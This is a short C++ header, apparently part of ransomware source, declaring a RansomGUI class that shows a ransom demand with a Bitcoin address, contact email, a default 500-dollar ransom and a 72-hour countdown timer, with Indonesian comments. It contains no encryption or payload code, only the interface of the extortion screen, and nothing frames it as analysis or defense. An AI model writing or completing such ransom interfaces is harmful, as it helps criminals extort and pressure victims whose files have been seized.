// ransom_gui.h
#pragma once
#include <string>
#include <atomic>
#include <thread>

class RansomGUI {
public:
    RansomGUI();
    ~RansomGUI();

    void start(const std::string& btc_address,
               const std::string& email,
               double ransom_usd = 500.0,
               int hours_left = 72);

    void stop();                    // Panggil jika ingin menutup GUI (jarang dipakai)

private:
    void guiThread();               // Thread utama GUI
    void renderFrame();             // Render ImGui setiap frame

    std::thread gui_thread;
    std::atomic<bool> running{false};

    std::string btc_address;
    std::string email;
    double ransom_amount;
    int remaining_hours;

    // Untuk countdown real-time
    std::chrono::steady_clock::time_point start_time;
};
